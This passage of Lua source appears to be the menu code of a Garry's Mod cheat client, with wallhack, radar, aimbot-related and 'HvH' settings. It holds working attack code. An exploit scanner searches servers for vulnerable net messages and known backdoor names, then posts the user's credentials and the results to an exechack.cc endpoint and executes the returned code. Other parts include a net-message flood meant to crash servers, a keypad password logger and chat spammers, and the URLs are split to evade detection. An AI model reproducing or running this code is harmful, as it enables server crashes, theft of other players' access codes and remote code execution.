                aG("Date", 15, 30 * 10, "WH_INFO_SHOW_DATE", au.tb.main.other)
                aG("Time", 15, 30 * 11, "WH_INFO_SHOW_TIME", au.tb.main.other)
                aG("Tickrate", 15, 30 * 12, "WH_INFO_SHOW_TICKRATE", au.tb.main.other)
                aG("Gamemode", 15, 30 * 13, "WH_INFO_SHOW_GAMEMODE", au.tb.main.other)
                aG("Target Aim", 15, 30 * 14, "WH_INFO_SHOW_TARGETAIM", au.tb.main.other)
                aG("Kills", 15, 30 * 15, "WH_INFO_SHOW_KILLS", au.tb.main.other)
                aG("Deads", 15, 30 * 16, "WH_INFO_SHOW_DEADS", au.tb.main.other)
                aG("Clip", 15, 30 * 17, "WH_INFO_SHOW_CLIP", au.tb.main.other)
            end)

            aG("Radar", 15, 30 * 10, "WH_RADAR", au.tb.main)

            bg(250, 30 * 10 + 1, au.tb.main, function()
                bh("Radar")
                b5("Distance", 15, 30, 1, 200, "WH_RADAR_DISTANCE", au.tb.main.other)

                ba(15, 30 * 2 + 20, "WH_RADAR_TYPE", {"Triangle", "Box"}, "Type", au.tb.main.other)

                aG("Show Names", 15, 30 * 3 + 55, "RDRSNA", au.tb.main.other)
            end)

            aG("Spectators list", 15, 30 * 11, "MISC_SPECTATORLIST", au.tb.main)

            bg(250, 30 * 11 + 1, au.tb.main, function()
                bh("Spectators list")
                aG("Only LocalPlayer", 15, 30, "MISC_SPECTATORLIST_ONLYLOCALPLAYER", au.tb.main.other)
                aP("LocalPlayer", "efont_19", 15, 30 * 2, au.tb.main.other)
                bi("MISC_SPECTATORLIST_COLOR_ME", 15, 80)
                aP("Players", "efont_19", 15, 80 + 160, au.tb.main.other)
                bi("MISC_SPECTATORLIST_COLOR_PLAYERS", 15, 80 + 160 + 20)
            end)

            local bo = b5("Aspect ratio", 15, 30 * 12, 0, 20, "ASPECTRATIO", au.tb.main)

            function bo:OnValueChanged(a)
                if not aspectratio then return end

                if a == 0 then
                    a1("ASPECTRATIO", 1.7)
                else
                    a1("ASPECTRATIO", a)
                end
            end

            aS("SkyBox", 15, 30 * 13 + 15, au.tb.main, function()
                bh("SkyBox")
                local bp = u("DTextEntry", au.tb.main.other)
                bp:SetPos(15, 30)
                bp:SetSize(220, 25)
                bp:SetText("")

                bp.Paint = function(self, ay, az)
                    o(5, 0, 0, ay, az, b._color_border)
                    o(5, 1, 1, ay - 2, az - 2, b._color_windowbg)
                    self:DrawTextEntryText(b._color_text, t(30, 130, 255), b._color_text)
                end

                aS("Change", 15, 70, au.tb.main.other, function()
                    if n() then
                        T([[local skybox = GetConVar("sv_skyname"):GetString()Material("skybox/"..skybox.."lf"):SetTexture("$basetexture",Material("skybox/]] .. bp:GetText() .. [[lf"):GetTexture("$basetexture"))Material("skybox/"..skybox.."ft"):SetTexture("$basetexture",Material("skybox/]] .. bp:GetText() .. [[ft"):GetTexture("$basetexture"))Material("skybox/"..skybox.."rt"):SetTexture("$basetexture",Material("skybox/]] .. bp:GetText() .. [[rt"):GetTexture("$basetexture"))Material("skybox/"..skybox.."bk"):SetTexture("$basetexture",Material("skybox/]] .. bp:GetText() .. [[bk"):GetTexture("$basetexture"))Material("skybox/"..skybox.."dn"):SetTexture("$basetexture",Material("skybox/]] .. bp:GetText() .. [[dn"):GetTexture("$basetexture"))Material("skybox/"..skybox.."up"):SetTexture("$basetexture",Material("skybox/]] .. bp:GetText() .. [[up"):GetTexture("$basetexture"))]])
                    end
                end)

                aS("Sky List", 15, 110, au.tb.main.other, function()
                    gui.OpenURL("ht" .. "tps://develo" .. "per.valvesoftw" .. "are.com/wi" .. "ki/Sk" .. "y_List")
                end)
            end)
        end)

        aZ(20 + 90, "selected_visuals", "Fonts", "Fonts", "FONTS", function()
            local bq = {"Akbar", "Coolvetica", "Roboto", "Arial", "Verdana", "Verdana Bold", "Trebuchet MS", "Courier New", "Tahoma", "Marlett", "ControlBG", "HalfLife2"}

            ba(15, 30, "WH_PLAYER_FONT", bq, "Player", au.tb.main)
            b5("Size", 15, 30 * 3, 12, 40, "WH_PLAYER_FONT_SIZE", au.tb.main)
            aG("Outline", 15, 30 * 5 - 20, "WH_PLAYER_FONT_OUTLINE", au.tb.main)
            ba(230, 30, "WH_ENTITY_FONT", bq, "Entity", au.tb.main)
            b5("Size", 230, 30 * 3, 12, 40, "WH_ENTITY_FONT_SIZE", au.tb.main)
            aG("Outline", 230, 30 * 5 - 20, "WH_ENTITY_FONT_OUTLINE", au.tb.main)

            aS("Reload", 15, 160, au.tb.main, function()
                if n() then
                    local ap = X["WH_PLAYER_FONT_OUTLINE"] and "true" or "false"
                    local aq = X["WH_ENTITY_FONT_OUTLINE"] and "true" or "false"
                    T([[surface.CreateFont("fontforplayers",{font="]] .. X["WH_PLAYER_FONT"] .. [[",size=]] .. X["WH_PLAYER_FONT_SIZE"] .. [[,shadow=true,outline=]] .. ap .. [[})surface.CreateFont("fontforentitys",{font="]] .. X["WH_ENTITY_FONT"] .. [[",size=]] .. X["WH_ENTITY_FONT_SIZE"] .. [[,shadow=true,outline=]] .. aq .. [[})]])
                end
            end)
        end)

        aZ(20 + 120, "selected_visuals", "Cloud Radar", "Cloud Radar", "CLOUD RADAR", function()
            aP("rp_bangclaw, rp_downtown_tits_v1", "efont_19", 15, 30, au.tb.main, 300)

            aS("Run", 15, 30 * 2, au.tb.main, function()
                if N == false and n() then
                    T([[local entlist = util.JSONToTable(']] .. util.TableToJSON(X["ENTITYLIST"]) .. [[')local function a(b)local c={}for d,e in ipairs(player.GetAll())do local f=e:GetPos()local g=Vector(b[1],b[2],b[3])local h=Angle(90,0,0)local i=b[4]/2+(f.x-g.x)/b[6]local j=b[5]/2+(g.y-f.y)/b[6]local k=h.y-90;k=math.rad(k)i=i-b[4]/2;j=j-b[5]/2;local l=i*math.cos(k)-j*math.sin(k)local m=i*math.sin(k)+j*math.cos(k)l=l+b[4]/2;m=m+b[5]/2;c[e:Name()]={x=math.Round(l),y=math.Round(m),color=team.GetColor(e:Team()),team=team.GetName(e:Team()),localplayer=e==LocalPlayer()and"yes"or"no",rank=e:GetUserGroup()}end;for d,e in ipairs(ents.GetAll())do if entlist[e:GetClass()]then local f=e:GetPos()local g=Vector(b[1],b[2],b[3])local h=Angle(90,0,0)local i=b[4]/2+(f.x-g.x)/b[6]local j=b[5]/2+(g.y-f.y)/b[6]local k=h.y-90;k=math.rad(k)i=i-b[4]/2;j=j-b[5]/2;local l=i*math.cos(k)-j*math.sin(k)local m=i*math.sin(k)+j*math.cos(k)l=l+b[4]/2;m=m+b[5]/2;c[e:GetClass()]={x=math.Round(l),y=math.Round(m),color=Color(255,255,255),team="",localplayer="no",rank=""}end end;return c end;local n={}n["rp_bangclaw"]={2579,-1103,6618,834,1078,9}n["rp_downtown_tits_v1"]={-163,-1239,7241,1280,720,15}timer.Create("]] .. I() .. [[",3,0,function()if n[game.GetMap()]then file.Write("]] .. b.cloudradarshit .. [[",util.TableToJSON(a(n[game.GetMap()])))end end)]])
                    N = true
                end
            end)

            aS("Copy Link", 245, 30 * 2, au.tb.main, function()
                SetClipboardText("ht" .. "tps://e" .. "xecha" .. "ck.cc/f" .. "orum/rad" .. "ar.p" .. "hp?user=" .. username)
            end)

            local function br()
                if IsValid(au.cloudradar) then
                    au.cloudradar:Remove()
                end

                au.cloudradar = vgui.Create("DHTML", au.tb.main)
                au.cloudradar:SetPos(15, 30 * 5)
                au.cloudradar:SetSize(533, 300)
                au.cloudradar:OpenURL("ht" .. "tps://e" .. "xecha" .. "ck.cc/f" .. "orum/rad" .. "ar.p" .. "hp?user=" .. username)
            end

            aS("Update", 15, 30 * 3 + 15, au.tb.main, function()
                br()
            end)

            br()
        end)
    end)

    aE(50 + 50 + 50, "Misc", function()
        aZ(20, "selected_misc", "mov", "Movement", "MOVEMENT", function()
            aG("Bunny hop", 15, 30, "MISC_BUNNYHOP", au.tb.main)
            aG("Auto Strafe", 15, 30 * 2, "MISC_AUTOSTRAFE", au.tb.main)

            ba(15, 30 * 3, "MISC_AUTOSTRAFE_TYPE", {"Legit", "Rage"}, "Auto Strafe Mode", au.tb.main)

            b5("Max Hops", 15, 30 * 5 + 5, 0, 10, "MISC_BUNNYHOP_SAVEHOPS", au.tb.main)
            aW("CIRCLESTRAFE_KEY", 15, 30 * 7 - 10, au.tb.main, "Circle Strafe Key")
        end)

        aZ(20 + 30, "selected_misc", "main", "Main", "MAIN", function()
            aG("Afk mode", 15, 30 * 1, "MISC_ANTIANTIAFK", au.tb.main)
            aG("Keypad logger", 15, 30 * 2, "MISC_KEYPADLOGGER", au.tb.main, "no" .. "t support keypad with secure mode")

            bg(250, 30 * 2 + 1, au.tb.main, function()
                bh("Keypad logger")
                aG("Auto enter password", 15, 30, "MISC_KEYPADLOGGER_AUTOENTER", au.tb.main.other)
                bi("MISC_KEYPADLOGGER_COLOR", 15, 30 * 2)
            end)

            aG("E Spammer", 15, 30 * 3, "E_SPAMMER", au.tb.main)

            aS("Custom disconnect", 15, 30 * 4, au.tb.main, function()
                if n() then
                    T([[timer.Create("]] .. rand() .. [[",0.1,0,function()for i=1,65536 do local a=util.NetworkIDToString(i)if a and not net.Receivers[a]then net.Start(a)net.SendToServer()end end end)]])
                end
            end)
        end)

        aZ(20 + 60, "selected_misc", "spa", "Spam", "SPAM", function()
            aP("Chat", "efont_19", 15, 30, au.tb.main)
            aG("Enabled", 15, 30 * 2, "MISC_SPAM_ENABLED", au.tb.main)
            aG("Ooc", 15, 30 * 3, "MISC_SPAM_OOC", au.tb.main)
            local aL = au.tb.main:Add("DCheckBoxLabel")
            aL:SetPos(15, 30 * 4)
            aL:SetText("Pm")
            aL:SetFont("efont_17")
            aL:SetValue(au["chatpmspammer"])
            aL.Lerp = 0

            function aL:OnChange(aM)
                if aM then
                    au["chatpmspammer"] = true
                    T([[ local chat_strings=util.JSONToTable(']] .. i(X["MISC_SPAM_TEXT"]) .. [[') timer.Create("checkforgaymazafaka",0.1,0,function() if rp then rp.RunCommand("pm",table.Random(player.GetAll()):SteamID(),chat_strings[math.random(#chat_strings)]) end RunConsoleCommand("pm",table.Random(player.GetAll()):SteamID(),chat_strings[math.random(#chat_strings)]) LocalPlayer():ConCommand("darkrp pm "..table.Random(player.GetAll()):Name().." "..chat_strings[math.random(#chat_strings)]) end) ]])
                else
                    au["chatpmspammer"] = false
                    T([[timer.Remove("checkforgaymazafaka")]])
                end
            end

            if desc then
                aL:SetToolTip(desc)
            end

            function aL.Button:Paint(aN, aO)
                o(5, 0, 0, aN, aO, b._color_border)
                o(5, 1, 1, aN - 2, aO - 2, b._color_windowbg)

                if self:GetChecked() then
                    aL.Lerp = G(0.05, aL.Lerp, 255)
                    aL:SetTextColor(b._color_text)
                    o(3, 3, 3, aN - 6, aO - 6, t(b._color_checkbox["r"], b._color_checkbox["g"], b._color_checkbox["b"], aL.Lerp))
                else
                    aL.Lerp = G(0.05, aL.Lerp, 150)
                    aL:SetTextColor(t(b._color_non_selected["r"], b._color_non_selected["g"], b._color_non_selected["b"], aL.Lerp))
                end
            end

            local bp = u("DTextEntry", au.tb.main)
            bp:SetPos(15, 30 * 5)
            bp:SetSize(220, 25)
            bp:SetText("")

            bp.Paint = function(self, ay, az)
                o(5, 0, 0, ay, az, b._color_border)
                o(5, 1, 1, ay - 2, az - 2, b._color_windowbg)
                self:DrawTextEntryText(b._color_text, t(30, 130, 255), b._color_text)
            end

            local function bs()
                if x(au.ch) then
                    au.ch:Remove()
                end

                au.ch = u("DScrollPanel", au.tb.main)
                au.ch:SetPos(15, 230)
                au.ch:SetSize(220, 200)

                au.ch.Paint = function(self, ay, az)
                    o(5, 0, 0, ay, az, b._color_border)
                    o(5, 1, 1, ay - 2, az - 2, b._color_windowbg)
                end

                local P = 0

                for K, Q in g(X["MISC_SPAM_TEXT"]) do
                    local bn = aS("", 0, P, au.ch, function()
                        X["MISC_SPAM_TEXT"][K] = nil
                        bs()
                        a1("MISC_SPAM_TEXT", X["MISC_SPAM_TEXT"])
                    end, 220, 25)

                    bn.Paint = function(K, ay, az)
                        o(5, 0, 0, ay, az, b._color_border)

                        if bn.Hovered then
                            bn.Lerp = G(0.09, bn.Lerp, 0)
                        else
                            bn.Lerp = G(0.09, bn.Lerp, 30)
                        end

                        o(5, 1, 1, ay - 2, az - 2, t(b._color_button.r - bn.Lerp, b._color_button.g - bn.Lerp, b._color_button.b - bn.Lerp))
                        s(Q, "efont_17", 3, 3, b._color_text)
                    end

                    P = P + 25
                end
            end

            aS("Add", 15, 30 * 6 + 5, au.tb.main, function()
                local bt = true

                for K, Q in g(X["MISC_SPAM_TEXT"]) do
                    if X["MISC_SPAM_TEXT"][K] == bp:GetText() then
                        bt = false
                    end
                end

                if bt then
                    X["MISC_SPAM_TEXT"][#X["MISC_SPAM_TEXT"] + 1] = bp:GetText()
                    a1("MISC_SPAM_TEXT", X["MISC_SPAM_TEXT"])
                end

                bs()
            end)

            bs()
            aP("Kill Say", "efont_19", 255, 30, au.tb.main)
            aG("Enabled", 255, 30 * 2, "SPAM_KILLSAY_ENABLED", au.tb.main)
            aG("Ooc", 255, 30 * 3, "SPAM_KILLSAY_OOC", au.tb.main)
            local bu = u("DTextEntry", au.tb.main)
            bu:SetPos(255, 30 * 5)
            bu:SetSize(220, 25)
            bu:SetText("")

            bu.Paint = function(self, ay, az)
                o(5, 0, 0, ay, az, b._color_border)
                o(5, 1, 1, ay - 2, az - 2, b._color_windowbg)
                self:DrawTextEntryText(b._color_text, t(30, 130, 255), b._color_text)
            end

            local function bv()
                if x(au.chf) then
                    au.chf:Remove()
                end

                au.chf = u("DScrollPanel", au.tb.main)
                au.chf:SetPos(255, 230)
                au.chf:SetSize(220, 200)

                au.chf.Paint = function(self, ay, az)
                    o(5, 0, 0, ay, az, b._color_border)
                    o(5, 1, 1, ay - 2, az - 2, b._color_windowbg)
                end

                local bw = 0

                for K, Q in g(X["SPAM_KILLSAY"]) do
                    local bn = aS("", 0, bw, au.chf, function()
                        X["SPAM_KILLSAY"][K] = nil
                        bv()
                    end, 220, 25)

                    bn.Paint = function(K, ay, az)
                        o(5, 0, 0, ay, az, b._color_border)

                        if bn.Hovered then
                            bn.Lerp = G(0.09, bn.Lerp, 0)
                        else
                            bn.Lerp = G(0.09, bn.Lerp, 30)
                        end

                        o(5, 1, 1, ay - 2, az - 2, t(b._color_button.r - bn.Lerp, b._color_button.g - bn.Lerp, b._color_button.b - bn.Lerp))
                        s(Q, "efont_17", 3, 3, b._color_text)
                    end

                    bw = bw + 25
                end

                a1("SPAM_KILLSAY", X["SPAM_KILLSAY"])
            end

            aS("Add", 255, 30 * 6 + 5, au.tb.main, function()
                local bt = true

                for K, Q in g(X["SPAM_KILLSAY"]) do
                    if X["SPAM_KILLSAY"][K] == bu:GetText() then
                        bt = false
                    end
                end

                if bt then
                    X["SPAM_KILLSAY"][#X["SPAM_KILLSAY"] + 1] = bu:GetText()
                end

                bv()
            end)

            bv()
        end)

        aZ(20 + 90, "selected_misc", "log", "Logs", "LOGS", function()
            local bx

            local function by(Q, ac)
                if x(au.chff) then
                    au.chff:Remove()
                end

                au.chff = u("DScrollPanel", au.tb.main)
                au.chff:SetPos(15, 100)
                au.chff:SetSize(530, 200 + 136)

                au.chff.Paint = function(self, ay, az)
                    o(5, 0, 0, ay, az, b._color_border)
                    o(5, 1, 1, ay - 2, az - 2, b._color_windowbg)
                end

                local bz = 0
                local bA = p(j(b.logs, "DATA"))

                for K, az in g(F("HLS", bA[Q][1])) do
                    if az == "" then return end

                    if h(z(az or "") or "", z(ac:Replace("[", ""):Replace("]", "") or "") or "") then
                        aS("", 0, bz, au.chff, function()
                            SetClipboardText(az)
                        end, 530, 25)

                        aP(az, "efont_17", 3, bz + 5, au.chff, 600)
                        bz = bz + 24
                    end
                end
            end

            local bu = u("DTextEntry", au.tb.main)
            bu:SetPos(15, 65)
            bu:SetSize(530, 25)
            bu:SetText("")

            bu.Paint = function(self, ay, az)
                o(5, 0, 0, ay, az, b._color_border)
                o(5, 1, 1, ay - 2, az - 2, b._color_windowbg)
                self:DrawTextEntryText(b._color_text, t(30, 130, 255), b._color_text)
            end

            bu.OnChange = function()
                by(bx, bu:GetText())
            end

            surface.SetFont("efont_19")
            local P = 15

            for K, Q in g({
                ["Kill"] = "kill",
                ["Damage"] = "damage",
                ["Connect"] = "connect",
                ["Disconnect"] = "disconnect",
                ["Change Name"] = "namechange",
                ["Chat"] = "chat"
            }) do
                aS(K, P, 30, au.tb.main, function()
                    if n() then
                        bx = Q
                        by(Q, bu:GetText())
                    end
                end, w(1, B(K)) + 10, 27)

                P = P + w(1, B(K)) + 20
            end
        end)

        aZ(140, "selected_misc", "expl", "Exploits", "EXPLOITS", function()
            aS("Refresh", 15, 30, au.tb.main, function()
                if x(au.ch) then
                    au.ch:Remove()
                end

                au.ch = u("DScrollPanel", au.tb.main)
                au.ch:SetPos(15, 70)
                au.ch:SetSize(320, 300)

                au.ch.Paint = function(self, ay, az)
                    o(5, 0, 0, ay, az, b._color_border)
                    o(5, 1, 1, ay - 2, az - 2, b._color_windowbg)
                end

                if n() then
                    T([[local a={"pplay_addrow","pplay_sendtable","WriteQuery","SendMoney","BailOut","customprinter_get","textstickers_entdata","NC_GetNameChange","ATS_WARP_REMOVE_CLIENT","ATS_WARP_FROM_CLIENT","ATS_WARP_VIEWOWNER","CFRemoveGame","CFJoinGame","CFEndGame","CreateCase","rprotect_terminal_settings","StackGhost","RevivePlayer","ARMORY_RetrieveWeapon","TransferReport","SimplicityAC_aysent","pac_to_contraption","SyncPrinterButtons76561198056171650","sendtable","steamid2","Kun_SellDrug","net_PSUnBoxServer","pplay_deleterow","pplay_addrow","CraftSomething","banleaver","75_plus_win","ATMDepositMoney","Taxi_Add","Kun_SellOil","SellMinerals","TakeBetMoney","PoliceJoin","CpForm_Answers","DepositMoney","MDE_RemoveStuff_C2S","NET_SS_DoBuyTakeoff","NET_EcSetTax","RP_Accept_Fine","RP_Fine_Player","RXCAR_Shop_Store_C2S","RXCAR_SellINVCar_C2S","drugseffect_remove","drugs_money","CRAFTINGMOD_SHOP","drugs_ignite","drugseffect_hpremove","DarkRP_Kun_ForceSpawn","drugs_text","NLRKick","RecKickAFKer","GMBG:PickupItem","DL_Answering","data_check","plyWarning","NLR.ActionPlayer","timebombDefuse","start_wd_emp","kart_sell","FarmingmodSellItems","ClickerAddToPoints","bodyman_model_change","TOW_PayTheFine","FIRE_CreateFireTruck","hitcomplete","hhh_request","DaHit","TCBBuyAmmo","DataSend","gBan.BanBuffer","fp_as_doorHandler","Upgrade","TowTruck_CreateTowTruck","TOW_SubmitWarning","duelrequestguiYes","JoinOrg","pac_submit","NDES_SelectedEmblem","join_disconnect","Morpheus.StaffTracker","casinokit_chipexchange","BuyKey","BuyCrate","FactionInviteConsole","FacCreate","1942_Fuhrer_SubmitCandidacy","pogcp_report_submitReport","textscreens_download","hsend","BuilderXToggleKill","Chatbox_PlayerChat","reports.submit","services_accept","Warn_CreateWarn","NewReport","soez","GiveHealthNPC","DarkRP_SS_Gamble","buyinghealth","DarkRP_preferredjobmodel","whk_setart","WithdrewBMoney","DuelMessageReturn","ban_rdm","BuyCar","ats_send_toServer","dLogsGetCommand","disguise","gportal_rpname_change","AbilityUse","ClickerAddToPoints","race_accept","give_me_weapon","FinishContract","NLR_SPAWN","Kun_ZiptieStruggle","JB_Votekick","Letthisdudeout","ckit_roul_bet","pac.net.TouchFlexes.ClientNotify","ply_pick_shit","TFA_Attachment_RequestAll","BuyFirstTovar","BuySecondTovar","GiveHealthNPC","MONEY_SYSTEM_GetWeapons","MCon_Demote_ToServer","withdrawp","PCAdd","ActivatePC","PCDelAll","viv_hl2rp_disp_message","ATM_DepositMoney_C2S","BM2.Command.SellBitcoins","BM2.Command.Eject","tickbooksendfine","egg","RHC_jail_player","PlayerUseItem","Chess Top10","ItemStoreUse","EZS_PlayerTag","simfphys_gasspill","sphys_dupe","sw_gokart","wordenns","SyncPrinterButtons16690","AttemptSellCar","uPLYWarning","atlaschat.rqclrcfg","dlib.getinfo.replicate","SetPermaKnife","EnterpriseWithdraw","SBP_addtime","NetData","CW20_PRESET_LOAD","minigun_drones_switch","NET_AM_MakePotion","bitcoins_request_turn_off","bitcoins_request_turn_on","bitcoins_request_withdraw","PermwepsNPCSellWeapon","ncpstoredoact","DuelRequestClient","BeginSpin","tickbookpayfine","fg_printer_money","IGS.GetPaymentURL","pp_info_send","AirDrops_StartPlacement","SlotsRemoved","FARMINGMOD_DROPITEM","cab_sendmessage","cab_cd_testdrive","blueatm","SCP-294Sv","dronesrewrite_controldr","desktopPrinter_Withdraw","RemoveTag","IDInv_RequestBank","UseMedkit","WipeMask","SwapFilter","RemoveMask","DeployMask","ZED_SpawnCar","levelup_useperk","passmayorexam","Selldatride","ORG_VaultDonate","ORG_NewOrg","ScannerMenu","misswd_accept","D3A_Message","LawsToServer","Shop_buy","D3A_CreateOrg","Gb_gasstation_BuyGas","Gb_gasstation_BuyJerrycan","MineServer","AcceptBailOffer","LawyerOfferBail","buy_bundle","AskPickupItemInv","donatorshop_itemtobuy","netOrgVoteInvite_Server","Chess ClientWager","AcceptRequest","deposit","CubeRiot CaptureZone Update","NPCShop_BuyItem","SpawnProtection","hoverboardpurchase","soundArrestCommit","LotteryMenu","updateLaws","TMC_NET_FirePlayer","thiefnpc","TMC_NET_MakePlayerWanted","SyncRemoveAction","HV_AmmoBuy","NET_CR_TakeStoredMoney","nox_addpremadepunishment","GrabMoney","LAWYER.GetBailOut","LAWYER.BailFelonOut","br_send_pm","GET_Admin_MSGS","OPEN_ADMIN_CHAT","LB_AddBan","redirectMsg","RDMReason_Explain","JB_SelectWarden","JB_GiveCubics","SendSteamID","wyozimc_playply","SpecDM_SendLoadout","sv_saveweapons","DL_StartReport","DL_ReportPlayer","DL_AskLogsList","DailyLoginClaim","GiveWeapon","GovStation_SpawnVehicle","inviteToOrganization","createFaction","sellitem","giveArrestReason","unarrestPerson","JoinFirstSS","bringNfreeze","start_wd_hack","DestroyTable","nCTieUpStart","IveBeenRDMed","FIGHTCLUB_StartFight","FIGHTCLUB_KickPlayer","ReSpawn","CP_Test_Results","AcceptBailOffer","IS_SubmitSID_C2S","IS_GetReward_C2S","ChangeOrgName","DisbandOrganization","CreateOrganization","newTerritory","InviteMember","sendDuelInfo","DoDealerDeliver","PurchaseWeed","guncraft_removeWorkbench","wordenns","userAcceptPrestige","vj_npcspawner_sv_create","DuelMessageReturn","Client_To_Server_OpenEditor","GiveSCP294Cup","GiveArmor100","SprintSpeedset","ArmorButton","HealButton","SRequest","ClickerForceSave","rpi_trade_end","NET_BailPlayer","vj_testentity_runtextsd","vj_fireplace_turnon2","requestmoneyforvk","gPrinters.sendID","FIRE_RemoveFireTruck","drugs_effect","drugs_give","NET_DoPrinterAction","opr_withdraw","money_clicker_withdraw","NGII_TakeMoney","gPrinters.retrieveMoney","revival_revive_accept","chname","NewRPNameSQL","UpdateRPUModelSQL","SetTableTarget","SquadGiveWeapon","BuyUpgradesStuff","REPAdminChangeLVL","SendMail","DemotePlayer","OpenGates","VehicleUnderglow","Hopping_Test","CREATE_REPORT","CreateEntity","FiremanLeave","DarkRP_Defib_ForceSpawn","Resupply","BTTTStartVotekick","_nonDBVMVote","REPPurchase","deathrag_takeitem","FacCreate","InformPlayer","lockpick_sound","SetPlayerModel","changeToPhysgun","VoteBanNO","VoteKickNO","shopguild_buyitem","MG2.Request.GangRankings","RequestMAPSize","gMining.sellMineral","ItemStoreDrop","optarrest","TalkIconChat","UpdateAdvBoneSettings","ViralsScoreboardAdmin","PowerRoundsForcePR","showDisguiseHUD","withdrawMoney","SyncPrinterButtons76561198027292625","phone","STLoanToServer","TCBDealerStore","TCBDealerSpawn","ts_buytitle","gMining.registerAchievement","gPrinters.openUpgrades"}local b={"Sbox_gm_attackofnullday_key","c","enablevac","ULXQUERY2","Im_SOCool","MoonMan","LickMeOut","SessionBackdoor","OdiumBackDoor","ULX_QUERY2","Sbox_itemstore","Sbox_darkrp","Sbox_Message","_blacksmurf","nostrip","Remove_Exploiters","Sandbox_ArmDupe","rconadmin","jesuslebg","disablebackdoor","blacksmurfBackdoor","jeveuttonrconleul","lag_ping","memeDoor","DarkRP_AdminWeapons","Fix_Keypads","noclipcloakaesp_chat_text","_CAC_ReadMemory","Ulib_Message","Ulogs_Infos","ITEM","nocheat","I?psilon","JQerystrip.disable","Sandbox_GayParty","DarkRP_UTF8","PlayerKilledLogged","OldNetReadData","Backdoor","cucked","NoNerks","kek","DarkRP_Money_System","BetStrep","ZimbaBackdoor","something","random","strip0","fellosnake","idk","||||","EnigmaIsthere","ALTERED_CARB0N","killserver","fuckserver","cvaraccess","_Defcon","dontforget","aze46aez67z67z64dcv4bt","nolag","changename","music","_Defqon","xenoexistscl","R8","AnalCavity","DefqonBackdoor","fourhead","echangeinfo","PlayerItemPickUp","thefrenchenculer","elfamosabackdoormdr","stoppk","noprop","reaper","Abcdefgh","JSQuery.Data(Post(false))","pjHabrp9EY","_Raze","88","Dominos","NoOdium_ReadPing","m9k_explosionradius","gag","_cac_","_Battleye_Meme_","legrandguzmanestla","ULogs_B","arivia","_Warns","xuy","samosatracking57","striphelper","m9k_explosive","GaySploitBackdoor","_GaySploit","slua","Bilboard.adverts:Spawn(false)","BOOST_FPS","FPP_AntiStrip","ULX_QUERY_TEST2","FADMIN_ANTICRASH","ULX_ANTI_BACKDOOR","UKT_MOMOS","rcivluz","SENDTEST","MJkQswHqfZ","INJ3v4","_clientcvars","_main","GMOD_NETDBG","thereaper","audisquad_lua","anticrash","ZernaxBackdoor","bdsm","waoz","stream","adm_network","antiexploit","ReadPing","berettabest","componenttolua","theberettabcd","negativedlebest","mathislebg","SparksLeBg","DOGE","FPSBOOST","N::B::P","PDA_DRM_REQUEST_CONTENT","shix","Inj3","AidsTacos","verifiopd","pwn_wake","pwn_http_answer","pwn_http_send","The_Dankwoo","PRDW_GET","fancyscoreboard_leave","DarkRP_Gamemodes","DarkRP_Armors","yohsambresicianatik<3","EnigmaProject","PlayerCheck","Ulx_Error_88","FAdmin_Notification_Receiver","DarkRP_ReceiveData","Weapon_88","__G____CAC","AbSoluT","mecthack","SetPlayerDeathCount","awarn_remove","fijiconn","nw.readstream","LuaCmd","The_DankWhy"}local c=0;local d=0;local e={}for f=1,10000 do local g=util.NetworkIDToString(f)if not g then break end;if table.HasValue(b,g)then c=c+1;table.insert(e,g.." "..f)if d<=c then d=c end elseif table.HasValue(a,g)then table.insert(e,g)c=c+1 else if d<3 then e={}end;c=0 end end;local h=""local i=0;for j=0,65536 do local k=util.NetworkIDToString(j)if k and k~=""then if not net.Receivers[k]then h=h..k;if table.HasValue(a,k)then i=i+1 end end end end;if i>15 then for l,m in SortedPairs(net.Receivers)do file.Append("]] .. b.exploits .. [[",l)end else file.Write("]] .. b.exploits .. [[",h)end if _G.Props_3 or _G.PropWhiteList then file.Append("]] .. b.exploits .. [[","spawnopropbypass")end]])
                end

                k(1, function()
                    if not au["selected_misclse"] == "Exploits" and not au["selected"] == "Misc" then return end
                    local aC = 3

                    function addexploits(ac, U, desc, type)
                        aS(ac, 3, aC, au.ch, function()
                            if type == nil then
                                if n() then
                                    T(U)
                                end
                            else
                                U()
                            end
                        end)

                        aC = aC + 34
                    end

                    if n() then
                        http.Post("ht" .. "tps://ex" .. "echac" .. "k.cc/for" .. "um/thi" .. "sgogo/ex" .. "plo" .. "its.php", {
                            username = username,
                            password = password,
                            dmdkg = j(b.exploits, "DATA")
                        }, RunStringEx)
                    end
                end)
            end)
        end)
    end)

    aE(50 + 50 + 50 + 50, "HvH", function()
        aZ(20, "selected_hvh", "antiaim", "Anti-Aim", "ANTI-AIM", function()
            aG("Enabled", 15, 30, "ANTIAIM_ENABLED", au.tb.main)

            ba(15, 30 * 2, "ANTIAIM_X", {"Up", "Down", "Jitter", "Emotion", "Fake-Down", "Fake-Up", "Semi-Jitter Down", "Semi-Jitter Up", "Spinbot"}, "X", au.tb.main)

            b5("Emotion X", 15, 30 * 4 + 10, 50, 100, "ANTIAIM_EMOTION_X", au.tb.main)

            ba(15, 30 * 6, "ANTIAIM_Y", {"Forward", "Backwards", "Jitter", "TJitter", "Sideways", "Emotion", "Static"}, "Y", au.tb.main)

            b5("Emotion Y", 15, 30 * 8 + 10, 20, 100, "ANTIAIM_EMOTION_Y", au.tb.main)
        end)

        aZ(20 + 30, "selected_hvh", "resolver", "Resolver", "RESOLVER", function()
            aG("Enabled", 15, 30, "RESOLVER", au.tb.main)

            ba(15, 30 * 2, "RESOLVER_X_AXIS", {"Off", "Down", "Up", "Center", "Invert", "Random", "Auto"}, "X", au.tb.main)

            ba(15, 30 * 4 + 10, "RESOLVER_Y_AXIS", {"Off", "Left", "Right", "Invert", "Random", "Auto"}, "Y", au.tb.main)
        end)

        aZ(20 + 30 + 30, "selected_hvh", "other", "Other", "OTHER", function()
            aG("HitSound", 15, 30, "HITSOUNDS", au.tb.main)

            bg(250, 30, au.tb.main, function()
                bh("HitSound")
                aP("garrysmod/addons/*/*.wav", "efont_17", 15, 30, au.tb.main.other)
                local bp = u("DTextEntry", au.tb.main.other)
                bp:SetPos(15, 30 + 30)
                bp:SetSize(220, 25)
                bp:SetText(X["HITSOUNDS_SOUND"])

                bp.Paint = function(self, ay, az)
                    o(5, 0, 0, ay, az, b._color_border)
                    o(5, 1, 1, ay - 2, az - 2, b._color_windowbg)
                    self:DrawTextEntryText(b._color_text, t(30, 130, 255), b._color_text)
                end

                aS("Change", 15, 70 + 30, au.tb.main.other, function()
                    a1("HITSOUNDS_SOUND", bp:GetText())
                end)

                aS("More Details", 15, 110 + 30, au.tb.main.other, function()
